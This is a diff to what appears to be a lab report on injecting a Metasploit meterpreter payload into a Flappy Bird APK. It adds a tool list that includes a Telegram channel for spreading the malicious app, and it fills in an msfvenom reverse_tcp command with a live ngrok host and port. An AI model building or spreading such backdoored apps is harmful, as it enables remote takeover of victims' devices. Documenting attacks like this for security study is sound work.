@@ -18,10 +18,19 @@ This report documents a cybersecurity demonstration showcasing the process of in
 6. Remote access establishment
 
 ## Technical Implementation
+### 0.Setup
+Before proceeding with the APK manipulation demonstration, it is essential to establish a proper testing environment with all necessary tools and prerequisites.
+#### Required Tools and Platform
+
+- Kali Linux Virtual Machine: Primary attack platform containing pre-installed penetration testing tools including the Metasploit Framework
+- APKTool: Android application reverse engineering tool for decompiling and recompiling APK files
+- Jarsigner: Java Archive Signing tool for digitally signing Android applications
+- Ngrok: Secure tunneling service for exposing local servers to the internet
+- Telegram Channel: Social engineering distribution platform for malicious APK deployment
 
 ### 1. APK Decompilation
 
-For this demonstration, we utilized the Flappy Bird APK downloaded from APKpure.com as our target application. The decompilation process was performed using APKTool, a reverse engineering tool for Android applications.
+For this demonstration, a Flappy Bird APK downloaded from APKpure.com was utilized as the target application. The decompilation process was carried out using APKTool, a reverse engineering tool for Android applications.
 
 **Command executed:**
 
@@ -41,7 +50,8 @@ For this demonstration, we utilized the Flappy Bird APK downloaded from APKpure.
 
 #### Ngrok Tunnel Configuration
 
-To establish a connection pathway from the victim device to our attack infrastructure, we configured Ngrok to create a secure tunnel. Ngrok provides a public endpoint that forwards traffic to our local attack machine.
+To establish a connection pathway from the victim device to our attack infrastructure, we configured Ngrok to create a secure tunnel. 
+Ngrok provides a public endpoint that forwards traffic to our local attack machine.
 
 **Command executed:**
 
@@ -59,7 +69,7 @@ Using Metasploit's msfvenom tool, we generated a malicious Android payload confi
 
 **Command executed:**
 
-```msfvenom -p android/meterpreter/reverse_tcp LHOST=[ngrok_domain] LPORT=[ngrok_port] -o payload.apk```
+```msfvenom -p android/meterpreter/reverse_tcp LHOST=6.tcp.eu.ngrok.io LPORT=16690 -o payload.apk```
 
 **Payload decompilation:**
 
